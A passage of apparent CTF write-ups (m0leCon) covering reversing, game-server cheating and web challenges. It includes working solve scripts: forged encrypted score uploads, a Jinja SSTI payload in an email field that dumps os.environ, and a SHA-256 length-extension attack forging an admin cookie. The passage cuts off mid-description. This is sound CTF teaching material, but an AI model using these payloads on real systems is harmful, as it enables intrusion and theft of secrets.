\u0026#34;output\u0026#34;: 1}, {\u0026#34;input\u0026#34;: 50, \u0026#34;output\u0026#34;: 1}, {\u0026#34;input\u0026#34;: 51, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 52, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 53, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 54, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 55, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 56, \u0026#34;output\u0026#34;: 1}, {\u0026#34;input\u0026#34;: 57, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 58, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 59, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 60, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 61, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 62, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 63, \u0026#34;output\u0026#34;: 0}] This seems to be output bits for each input number from 0 to 63, probably given by the encoder program.\nLooking at the binary in a disassembler/decompiler we see that indeed it takes a number between 0 and 63 as input, does some calculations, and outputs a 0 or 1. An array called flag is used in these calculations, so the idea is probably to find what values we have to put in the flag array to give the output in output.txt.\nThe relevant code from the main function looks like this:\nint input_int; uint8_t output_bit; scanf(\u0026#34;%d\u0026#34;, \u0026amp;input_int); if (input_int \u0026gt;= 0 \u0026amp;\u0026amp; input_int \u0026lt;= 0x3f) { for (int i=0; i\u0026lt;6; ++i) { bits[5 - i] = input_int \u0026amp; 1; input_int \u0026gt;\u0026gt;= 1; } first_step(bits, values); second_step(values); third_step(values, \u0026amp;output_bit); printf(\u0026#34;%d\u0026#34;, output_bit); } We see there are three parts. The first_step function does the following:\nvoid first_step(uint8_t *bits, uint8_t *out) { for (int i=0; i\u0026lt;0x40; i++) { out_val = 0; for (int j=0; j\u0026lt;2; j++) { uint8_t term = 1; for (int k=0; k\u0026lt;6; k++) term \u0026amp;= first_step_array[i*0xc + j*6 + k](bits[k]); out_val |= term; } out[i] = out_val; } } The first_step_array used here is an array of functions, which are either neg or identity, doing the obvious.\nsecond_step is where the flag array comes in:\nvoid second_step(uint8_t *values) { for (int i=0; i\u0026lt;0x40; i++) vals[i] \u0026amp;= flag[i]; } And finally third_step. It uses an array of constants called chains which we can read out from the binary:\nvoid third_step(uint8_t *values, uint8_t *out_bit) { char terms[8]; *out_bit = 0; for (int i=0; i\u0026lt;8; i++) { for (int j=0; j\u0026lt;8; j++) terms[j] = values[chains[i*8 + (j+1) % 8]] \u0026amp; values[chains[i*8 + j]]; *out_bit |= terms[0] | terms[1] | terms[2] | terms[3] | terms[4] | terms[5] | terms[6] | terms[7]; } } So the path seems clear, find values for flag that makes the calculations in these three functions output the bits given in output.txt, for each number 0 through 63.\nI rewrote the functions in python and added z3 code to find the flag bits. This outputs around 50 similar flags. Not sure if this is intentional or I missed something in the code, but if we assume the flag is correct english and without leet speak there is only one choice: ptm{itslogic}.\nSolve script below:\nfirst_step_array = [1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1] chains = [62, 56, 8, 39, 24, 43, 7, 11, 20, 61, 22, 58, 53, 18, 41, 3, 48, 59, 23, 9, 46, 63, 6, 2, 26, 25, 55, 0, 60, 54, 32, 12, 28, 42, 15, 10, 38, 50, 5, 52, 27, 47, 37, 13, 21, 14, 49, 57, 45, 19, 29, 44, 34, 40, 16, 33, 36, 30, 17, 31, 1, 35, 51, 4] from z3 import * import json import string alph = string.ascii_letters + string.digits s = Solver() flag = [BitVec(f\u0026#34;b{i}\u0026#34;,1) for i in range(64)] output = json.loads(open(\u0026#34;output.txt\u0026#34;).read()) def xform(val): vals = [0] * 64 bits = list(map(int,bin(val)[2:].zfill(6))) for i in range(64): out = 0 for j in range(2): term = 1 for k in range(6): term \u0026amp;= first_step_array[12*i + 6*j + k] ^ bits[k] out |= term vals[i] = out return vals for n in range(64): vals = xform(n) out = vals[chains[0]] \u0026amp; vals[chains[1]] \u0026amp; flag[chains[0]] \u0026amp; flag[chains[1]] for i in range(8): for j in range(8): idx1 = i*8 + j idx2 = i*8 + (j+1) % 8 v = vals[chains[idx1]] \u0026amp; vals[chains[idx2]] out |= v \u0026amp; flag[chains[idx1]] \u0026amp; flag[chains[idx2]] s.add(out == output[n][\u0026#34;output\u0026#34;]) while s.check() == sat: m = s.model() sol = [m.evaluate(flag[i], model_completion=True).as_long() for i in range(64)] cond = flag[0] != sol[0] for i in range(1, 64): cond = Or(cond, flag[i] != sol[i]) s.add(cond) num = int(\u0026#34;\u0026#34;.join(map(str,sol)),2) st = num.to_bytes(8, \u0026#34;big\u0026#34;) if all(c in alph.encode() for c in st): print(st) PTC - Pwn The Circles! Are you better than Cookiezi? Show it to us and win a fantastic prize 🚩! (P.S. the flag will appear in your profile page)\nClick\nAuthor: @Pixel_01\nIn this challenge we are given an enormous JAR file, that contains a modified version of opsu!. The big difference is that it reports the scores to a custom server, and comes with 3 songs that are recognized on the server. Our goal is to register a user on the server, then upload a score for each song that is above a certain threshold. At this point, we will get the flag from the website.\nThe first level is extremely short, and ends up uploading a score even if you lose. Sniffing the connection going from Java, shows that is requests a key from https://ptc.m0lecon.fans/api/key and then sends some JSON-data with a base64-encoded blob to https://ptc.m0lecon.fans/api/upload afterwards. Searching for these strings do not yield any hits, but after diffing with the original game we find the class itdelatrisu.opsu.i.D which contains the scoreboard logic.\nEssentially, the game will\nConvert the scoreboard data to JSON Send the username to the key API Decrypt the resulting key using a key derived from the username Encrypt the scoreboard data with the decrypted key It will also hash the entire JAR file with sha256, and upload it together with the scoreboard data. This functions as a crude anti-tampering gimmick, but is easily bypassed.\nThe following code is able to upload the scores by enabling the various data parts one by one.\nfrom hashlib import pbkdf2_hmac from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad import requests import base64 import json name = b\u0026#34;iHqikf5sip8TLiFZ\u0026#34; salt = base64.b64decode(\u0026#34;cHdudGhlbTBsZQ==\u0026#34;) iv = name key1 = pbkdf2_hmac( hash_name = \u0026#39;sha256\u0026#39;, password = name, salt = salt, iterations = 65536, dklen = 32 ) key2_enc = base64.b64decode(requests.get(\u0026#34;https://ptc.m0lecon.fans/api/key\u0026#34;, headers={\u0026#34;Id\u0026#34;:name.decode(), \u0026#34;User-Agent\u0026#34;:\u0026#34;Java/16.0.2\u0026#34;}).content) key2 = pbkdf2_hmac( hash_name = \u0026#39;sha256\u0026#39;, password = unpad(AES.new(key1[:32], AES.MODE_CBC, iv).decrypt(key2_enc), 16), salt = salt, iterations = 65536, dklen = 32 ) data = {\u0026#34;map\u0026#34;:{\u0026#34;MID\u0026#34;:196716,\u0026#34;title\u0026#34;:\u0026#34;You Suffer\u0026#34;,\u0026#34;artist\u0026#34;:\u0026#34;Napalm Death\u0026#34;,\u0026#34;creator\u0026#34;:\u0026#34;MillhioreF\u0026#34;,\u0026#34;version\u0026#34;:\u0026#34;Easy\u0026#34;,\u0026#34;score\u0026#34;:931,\u0026#34;MSID\u0026#34;:67814},\u0026#34;player\u0026#34;:\u0026#34;iHqikf5sip8TLiFZ\u0026#34;,\u0026#34;checksum\u0026#34;:\u0026#34;c30df1bb74ad3ac7283f11c24324dab92efaec45b6e4df71c3620c1a575d8997\u0026#34;} data = {\u0026#34;map\u0026#34;:{\u0026#34;MID\u0026#34;:87431,\u0026#34;title\u0026#34;:\u0026#34;FREEDOM DiVE\u0026#34;,\u0026#34;artist\u0026#34;:\u0026#34;xi\u0026#34;,\u0026#34;creator\u0026#34;:\u0026#34;Nakagawa-Kanon\u0026#34;,\u0026#34;version\u0026#34;:\u0026#34;FOUR DIMENSIONS\u0026#34;,\u0026#34;score\u0026#34;:132408003,\u0026#34;MSID\u0026#34;:39804},\u0026#34;player\u0026#34;:\u0026#34;iHqikf5sip8TLiFZ\u0026#34;,\u0026#34;checksum\u0026#34;:\u0026#34;c30df1bb74ad3ac7283f11c24324dab92efaec45b6e4df71c3620c1a575d8997\u0026#34;} data = {\u0026#34;map\u0026#34;:{\u0026#34;MID\u0026#34;:31337,\u0026#34;title\u0026#34;:\u0026#34;Skype x Can Can\u0026#34;,\u0026#34;artist\u0026#34;:\u0026#34;Ara Potato\u0026#34;,\u0026#34;creator\u0026#34;:\u0026#34;Real\u0026#34;,\u0026#34;version\u0026#34;:\u0026#34;Hard\u0026#34;,\u0026#34;score\u0026#34;:3133773314,\u0026#34;MSID\u0026#34;:47078},\u0026#34;player\u0026#34;:\u0026#34;iHqikf5sip8TLiFZ\u0026#34;,\u0026#34;checksum\u0026#34;:\u0026#34;c30df1bb74ad3ac7283f11c24324dab92efaec45b6e4df71c3620c1a575d8997\u0026#34;} data = pad(json.dumps(data).encode(), 16) enc = AES.new(key2, AES.MODE_CBC, iv).encrypt(data) data = base64.b64encode(enc).decode() res = requests.post(\u0026#34;https://ptc.m0lecon.fans/api/upload\u0026#34;, json={\u0026#34;data\u0026#34;:data}, headers={\u0026#34;Id\u0026#34;:name.decode(), \u0026#34;User-Agent\u0026#34;:\u0026#34;Java/16.0.2\u0026#34;}) print(res.content) print(base64.b64decode(res.content)) YASM Yet Another Super Mario, a Turin based platform game! (You may need to install libglew-dev libglfw3 via apt; you also need to extract client_required files.7z inside the same folder as the client. Tested on Ubuntu 20.04, Mint 20.3, MX 21.1 baremetal)\nConnect using: ./client 108.128.200.4\nAuthor: @matpro\nThe included client runs a Super Mario\u0026hellip;eh\u0026hellip;inspired game. It is very wonky, and runs at a speed where you can\u0026rsquo;t really control the character at all. After proceeding through the map, mostly skipping dangers by luck, we get to a series of walls with a flag on the very right side of the map.\nThere\u0026rsquo;s much to go into for this challenge, but the main parts is that the game actually runs on the server, and the client is just sending keypresses to the remote. It gets the game state, represented as matrices, sent back every now and then. Thus, modifying the game client does not give us the possibility to pass through walls or something like that. The only thing the client does, is to send keys and render the game state.\nThe protocol represents keypresses as two DWORDs, and can send multiple of them in the same packet. The first DWORD says if the player is pressing the UP-key, or if any of the buttons \u0026ldquo;F, L, A, G\u0026rdquo; are pressed. The second DWORD says if the player is going left or right, as it can\u0026rsquo;t do both at the same time.\nOn the server side, there is a check that if your x-position is larger than 400, and the keys \u0026ldquo;FALG\u0026rdquo; (in that order) are pressed, it will actually send you the flag. But that position is far to the right, through the various walls that we cannot get through.\nLuckily, there is a bug in the game, that was found by experimentation.\nif ( keypress == GLFW_KEY_UP ) { if ( y_pos \u0026lt; 0.65 \u0026amp;\u0026amp; (y_pos == (*a2)[2 * v19] || y_pos == (*a2)[2 * v19 + 1]) ) { Mat4::operator*=(\u0026amp;v24, \u0026amp;typ); y_accelerate = 5; } LODWORD(keypress) = 0; } if ( HIDWORD(keypress) == GLFW_KEY_RIGHT ) { if ( v30 \u0026gt; -40.15 \u0026amp;\u0026amp; !is_moving_left \u0026amp;\u0026amp; (should_send_matrix || y_pos \u0026gt;= a3[v19 + 1]) ) Mat4::operator*=(\u0026amp;v23, \u0026amp;txn); is_moving_left = 0; HIDWORD(keypress) = 0; } if ( HIDWORD(keypress) == GLFW_KEY_LEFT ) { if ( v30 \u0026lt; 0.0 \u0026amp;\u0026amp; is_moving_left == 1 \u0026amp;\u0026amp; (should_send_matrix || y_pos \u0026gt;= a3[v19 - 1]) ) Mat4::operator*=(\u0026amp;v23, \u0026amp;txp); is_moving_left = 1; HIDWORD(keypress) = 0; } if ( !should_send_matrix \u0026amp;\u0026amp; a3[v19] \u0026gt; y_pos ) { if ( is_moving_left ) Mat4::operator*=(\u0026amp;v23, \u0026amp;txn); else Mat4::operator*=(\u0026amp;v23, \u0026amp;txp); } should_send_matrix = 1 - should_send_matrix; Whenever we are going left, a flag is set. There is also a flag that toggles every game tick, which decides if it should send the matrix or not. It is possible to hit multiple of these blocks in a single tick, and end up glitching through a wall. However, it is not very reliable in the client program and there is a time limit before the server disconnects us, so we need to perfect it \u0026ndash; or write our own client.\nfrom pwn import * from struct import pack import random UR = 13337 UL = 13338 U = 0x109 L = 0x107 R = 0x106 context.log_level = \u0026#34;debug\u0026#34; context.log_file = \u0026#39;./log.txt\u0026#39; def get_data(key): if key == UR: return pack(\u0026#34;\u0026lt;LL\u0026#34;, U, R) elif key == UL: return pack(\u0026#34;\u0026lt;LL\u0026#34;, U, L) elif key in [U, 70, 65, 76, 71]: return pack(\u0026#34;\u0026lt;LL\u0026#34;, key, 0) elif key in (L, R): return pack(\u0026#34;\u0026lt;LL\u0026#34;, 0, key) def submit(keypresses): for keys in keypresses: tosend = b\u0026#34;\u0026#34; if hasattr(keys, \u0026#34;__iter__\u0026#34;): for key in keys: tosend += get_data(key) else: tosend = get_data(keys) print(tosend) r.send(tosend) # time.sleep(0.05) gg = r.recv(timeout=0.1) if b\u0026#34;ptm{\u0026#34; in gg: print(gg) print(\u0026#34;WWTTTFFFF\u0026#34;) pause() elif b\u0026#34;died\u0026#34; in gg: print(gg) print(\u0026#34;ded\u0026#34;) pause() r = remote(\u0026#34;108.128.200.4\u0026#34;, 11223) r.send(b\u0026#34;newgame\u0026#34;) print(r.recv()) time.sleep(3) submit([R,UR]) submit([UR]*20) submit([UR]*10) submit([(UR,UR,UR,L,UR,UR,L,UR,UR,L,UR,UR) for _ in range(100)]) submit([(UR,UR,UR,L,UR,UR,L,UR,UR,L,UR,UR) for _ in range(100)]) submit([70, 65, 76, 71]) # FALG r.interactive() The script tries desperately to jump while holding right in the beginning, hoping to make it to the walls. This does not always work, because the game is not really deterministic with network latency. Then it will try to fuzz inputs a bit, glitching through the walls. Once it is reasonably sure that it has reached the flag, it will send the keypresses for \u0026ldquo;FALG\u0026rdquo; and wait.\nptm{thr0ugh_7he_wall5!_but_wher3_1s_peach??}\nweb Dumb Forum Author: @italianconcerto\nDescription: You\u0026rsquo;re telling me you can\u0026rsquo;t break such a simple forum?\nWe are provided with a Flask application that contains a user system, but it is also possible to post public posts to the index page.\nThe flag is set in an environment variable in the Dockerfile. Knowing this we know our goal is to get access to the system environment variables.\nAfter reading through the source code of the Flask application, we find the following route (/profile) where the user can edit and view its profile.\n@app.route(\u0026#39;/profile\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) @login_required def profile(): with open(\u0026#39;app/templates/profile.html\u0026#39;) as p: profile_html = p.read() profile_html = profile_html % (current_user.username, current_user.email, current_user.about_me) if(current_user.about_me == None): current_user.about_me = \u0026#34;\u0026#34; return render_template_string(profile_html) Flask has existing methods for rendering template, for example render_template. However, in this case we see that the profile route reads the template file and uses string format instead to inject the username, email, and about_me of the user into the template.\nIn profile.html we can see this:\n\u0026lt;h5 class=\u0026#34;card-title\u0026#34;\u0026gt;Username: %s\u0026lt;/h5\u0026gt; \u0026lt;p\u0026gt;Email: %s\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;\u0026#34;\u0026gt;About me: %s\u0026lt;/p\u0026gt; The form is parsed through EditProfileForm, which contains:\nclass EditProfileForm(FlaskForm): username = StringField(\u0026#39;Username\u0026#39;, validators=[DataRequired()]) about_me = TextAreaField(\u0026#39;About me\u0026#39;, validators=[Length(min=0, max=1000)]) submit = SubmitField(\u0026#39;Submit\u0026#39;) def __init__(self, original_username, *args, **kwargs): super(EditProfileForm, self).__init__(*args, **kwargs) self.original_username = original_username def validate_username(self, username): for c in \u0026#34;}{\u0026#34;: if c in username.data: abort(400) #raise ValidationError(\u0026#39;Please use valid characters.\u0026#39;) if username.data != self.original_username: user = User.query.filter_by(username=self.username.data).first() if user is not None: abort(409) #raise ValidationError(\u0026#39;Please use a different username.\u0026#39;) def validate_about_me(self, about_me): for c in \u0026#34;}{\u0026#34;: if c in about_me.data: abort(400) The form validates the username and about_me fields, and checks if they contains either of }{ (which are typically used with SSTI (Server Side Template Injection). But the form does not allow editing the email field of the user.\nWe find another form, RegistrationForm which is used during registration, and it is here, and only here, the email of the user is set. The validation of the email does however not include the }{ validation, which means we can register with an email and potentially perform a SSTI.\nclass RegistrationForm(FlaskForm): username = StringField(\u0026#39;Username\u0026#39;, validators=[DataRequired()]) email = StringField(\u0026#39;Email\u0026#39;, validators=[DataRequired(), Email()]) password = PasswordField(\u0026#39;Password\u0026#39;, validators=[DataRequired()]) password2 = PasswordField(\u0026#39;Repeat Password\u0026#39;, validators=[DataRequired(), EqualTo(\u0026#39;password\u0026#39;)]) submit = SubmitField(\u0026#39;Register\u0026#39;) def validate_username(self, username): for c in \u0026#34;}{\u0026#34;: if c in username.data: raise ValidationError(\u0026#39;Please use valid characters.\u0026#39;) user = User.query.filter_by(username=username.data).first() if user is not None: raise ValidationError(\u0026#39;Please use a different username.\u0026#39;) def validate_email(self, email): user = User.query.filter_by(email=email.data).first() if user is not None: raise ValidationError(\u0026#39;Please use a different email address.\u0026#39;) The email field does however include an email validator: email = StringField('Email', validators=[DataRequired(), Email()])\nWe see that this validator comes from wtforms: from wtforms.validators import ValidationError, DataRequired, Email, EqualTo\nLooking into the source code of the wtforms validator, we see that it uses the email-validator library.\nBy looking at the specification for the local-part of an email, we see that the following characters are allowed in an email:\nuppercase and lowercase Latin letters A to Z and a to z digits 0 to 9 printable characters !#$%\u0026amp;\u0026rsquo;*+-/=?^_`{|}~ dot ., provided that it is not the first or last character and provided also that it does not appear consecutively (e.g., John..Doe@example.com is not allowed).[5] space and special characters \u0026ldquo;(),:;\u0026lt;\u0026gt;@[] are allowed with restrictions (they are only allowed inside a quoted string, as described in the paragraph below, and in that quoted string, any backslash or double-quote must be preceded once by a backslash); comments are allowed with parentheses at either end of the local-part; e.g., john.smith(comment)@example.com and (comment)john.smith@example.com are both equivalent to john.smith@example.com. This means that an email such as {{self.__dict__}}@a.a will be considered a valid email.\nWe now know that our goal is to perform a SSTI on the email field.\nWe can use the get_flashed_messages of Flask to get the __globals__ of the application. And with this we generate a payload that returns the environment variables of the system, resulting in the flag. {{get_flashed_messages.__globals__.os.environ}}@z.c\nEmail: environ({ \u0026#34;PATH\u0026#34;:\u0026#34;/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;, \u0026#34;HOSTNAME\u0026#34;:\u0026#34;35250adbc3f0\u0026#34;, \u0026#34;LANG\u0026#34;:\u0026#34;C.UTF-8\u0026#34;, \u0026#34;GPG_KEY\u0026#34;:\u0026#34;A035C8C19219BA821ECEA86B64E628F8D684696D\u0026#34;, \u0026#34;PYTHON_VERSION\u0026#34;:\u0026#34;3.10.4\u0026#34;, \u0026#34;PYTHON_PIP_VERSION\u0026#34;:\u0026#34;22.0.4\u0026#34;, \u0026#34;PYTHON_SETUPTOOLS_VERSION\u0026#34;:\u0026#34;58.1.0\u0026#34;, \u0026#34;PYTHON_GET_PIP_URL\u0026#34;:\u0026#34;https://github.com/pypa/get-pip/raw/38e54e5de07c66e875c11a1ebbdb938854625dd8/public/get-pip.py\u0026#34;, \u0026#34;PYTHON_GET_PIP_SHA256\u0026#34;:\u0026#34;e235c437e5c7d7524fbce3880ca39b917a73dc565e0c813465b7a7a329bb279a\u0026#34;, \u0026#34;FLASK_APP\u0026#34;:\u0026#34;main.py\u0026#34;, \u0026#34;FLAG\u0026#34;:\u0026#34;ptm{d1d_u_f1nd_th3_r1ckr0ll?}\u0026#34;, \u0026#34;HOME\u0026#39;:\u0026#34;/home/app\u0026#34;} )@a.a FLAG: ptm{d1d_u_f1nd_th3_r1ckr0ll?}\nFancy Notes Hello my friend, I need your help! As you know, in Italy food is very important and I\u0026rsquo;m not good at it\u0026hellip; but I want to surprise my parents with a special recipe. I asked Marco Giordano for an advice, he is very good, but he didn\u0026rsquo;t want to reveal his secrets\u0026hellip; I know he saves his recipes on Fancy Notes, find a way to steal them.\nAuthor: @RxThorn\nAttached to the challenge is a Python Flask application.\nIn the app folder inside of the models.py we can see that the FLAG is first read from the environemnt variable FLAG and in the init_db function we see that a new note with the flag is created and append to the admin users note. So in order to get the flag we will probably have to read the note as admin.\nIf we inspect the notes route in routes.js we see that it will call the method get_user, this method will then call serialize_user with the first part of the base64 decoded value of the cookie (the part before the first |). The serialize_user will parse the user_string and return a python dictionary. The problem with the parsing is that if the username property is set more than one time, the last username will be selected. If it is possible to add another username to the user_string, we will be able to become admin.\nIf we inspect the authorization for the application inside the utils.py file, we see that the whole authentication and authorizatio scheme of the application relies on a SHA256 hash. The problem with this is that we can use a length extension attack in order to add another username to the user string. This means that since the serialize_user method only is a dictonary, we can append another username to the user_string and then generate a valid hash (via hash extension) in order to become the admin user. To exploit this vulnerability we can use the HashPump project https://github.com/bwall/HashPump to perform the attack.\nTo run the exploit we must first register a valid user. This will give us a valid base64 encoded user cookie that contains SECRET KEY + user_string. The data we want to extend the string with is ,username=admin. The small hurdle we must overcome is that in order to perform the attack, we must know the length of the secret key. This can be brute forced since the /notes endpoint will give HTTP response code 302 if the user cookie is invalid, and a 200 OK if it is valid. We can therefore brute force the length of the secret key.\nimport base64 import hashpumpy import requests import re def make_request(user_string, signature): notes_url = \u0026#34;https://fancynotes.m0lecon.fans/notes\u0026#34; encode_me = f\u0026#34;{user_string}|{signature}\u0026#34; user_string = f\u0026#34;{user_string.decode(\u0026#39;raw_unicode_escape\u0026#39;)}|{signature}\u0026#34; cookie_value = base64.b64encode(user_string.encode(\u0026#39;raw_unicode_escape\u0026#39;)).decode() cookies = dict(user=cookie_value) response = requests.get(notes_url, cookies=cookies, allow_redirects=False) return response def is_valid_signature(user_string, signature): resp = make_request(user_string, signature) if resp.status_code == 200: return True else: return False if __name__ == \u0026#39;__main__\u0026#39;: print(\u0026#34;Pwning...\u0026#34;) hexdigest = \u0026#34;REPLACE_WITH_RESULT_BASE64_DECODED_HASH_PART\u0026#34; pattern = \u0026#34;ptm\\{(.*)\\}\u0026#34; for x in range(1, 100): digest, msg = hashpumpy.hashpump(hexdigest, \u0026#34;username=hackerman,locale=en\u0026#34;, \u0026#34;,username=admin\u0026#34;, x) if is_valid_signature(msg, digest): print(f\u0026#34;Correct length is: {x}\u0026#34;) response = make_request(msg, digest) result = re.search(pattern, response.text) flag = result.group(0) print(f\u0026#34;Flag is: {flag}\u0026#34;) break If we run the script with the correctly configured values we get the flag:\nFLAG:ptm{pleaseD0NOTUseCr3am1nCarbon4r4!}\nhack(pt)MD Author: @Xato\nDescription: Hey, do you like markdown?\nhttps://hackptmd.m0lecon.fans/\nWe are also given a zip-file with source code.\nLet\u0026rsquo;s start by looking at the web page in the browser (see the picture below). The text on the index page \u0026ldquo;Create and share Markdown documents easily\u0026rdquo; and its title \u0026ldquo;hack(pt)MD\u0026rdquo; tells us that this is a Markdown note application similar to HackMD. We see that we can sign up, login and logout. The remaining pages require us to login, so let\u0026rsquo;s do that!\nAfter signing up and logging in, we see that there is a bullet list with our documents in My docs, the Last page let\u0026rsquo;s us edit the last document, and we can create a new document in New. This is how the editor looks:\nAs you might have noticed on the picture above, the preview window of the editor renders HTML. Also, there is a \u0026ldquo;Report abuse\u0026rdquo;-link at the bottom suggesting that an admin or similar with higher priviliges will go to the documents that are reported.\nNow that we\u0026rsquo;ve got a feeling of this web page and figured that we can insert HTML, it is time to look at the source code.\nThe content of the source code is visualized in the directory tree below. It contains a Docker Compose file making it easy to host ourselves. The file sets up the services frontend, backend, and bot.\n. ├── backend │ ├── Dockerfile │ ├── package.json │ ├── package-lock.json │ └── server.js ├── bot │ ├── bot.js │ ├── Dockerfile │ ├── package.json │ ├── package-lock.json │ └── server.js ├── docker-compose.yml └── frontend ├── build │ ├── asset-manifest.json │ ├── index.html │ ├── manifest.json │ ├── robots.txt │ └── static │ ├── css │ │ ├── main.97f500ae.css │ │ └── main.97f500ae.css.map │ └── js │ ├── 787.cda612ba.chunk.js │ ├── 787.cda612ba.chunk.js.map │ ├── main.5effb61a.js │ ├── main.5effb61a.js.LICENSE.txt │ └── main.5effb61a.js.map ├── default.conf ├── Dockerfile ├── package.json ├── package-lock.json ├── public │ ├── index.html │ ├── manifest.json │ └── robots.txt ├── README.md └── src ├── App.css ├── App.js ├── App.test.js ├── components │ ├── Auth.js │ ├── Document.js │ ├── DocumentList.js │ ├── Home.js │ ├── Message.js │ ├── Navbar.js │ ├── NewDocument.js │ └── Success.js ├── index.css ├── index.js ├── logo.svg ├── reportWebVitals.js └── setupTests.js The frontend is a React app.\nThe bot is interesting because it usually simulates an admin or any asset with higher privileges. We want something from them, often a cookie or something only they can access. The code tells us the bot does the following:\nOpens the website in the browser Logs in Goes to the URL (the one that has been reported) Clicks logout Note that adding the following to the bot.js file enables console logging to the terminal. It can be useful when running the application locally:\nlet page = await browser.newPage() page.on(\u0026#39;console\u0026#39;, message =\u0026gt; console.log(`${message.type().substr(0, 3).toUpperCase()} ${message.text()}`)) .on(\u0026#39;pageerror\u0026#39;, ({ message }) =\u0026gt; console.log(message)) .on(\u0026#39;response\u0026#39;, response =\u0026gt; console.log(`${response.status()} ${response.url()}`)) .on(\u0026#39;requestfailed\u0026#39;, request =\u0026gt; console.log(`${request.failure().errorText} ${request.url()}`)) In the backend, the flag lies in a document owned by the user \u0026ldquo;admin\u0026rdquo;. We can tell because the backend service inserts a document with the title 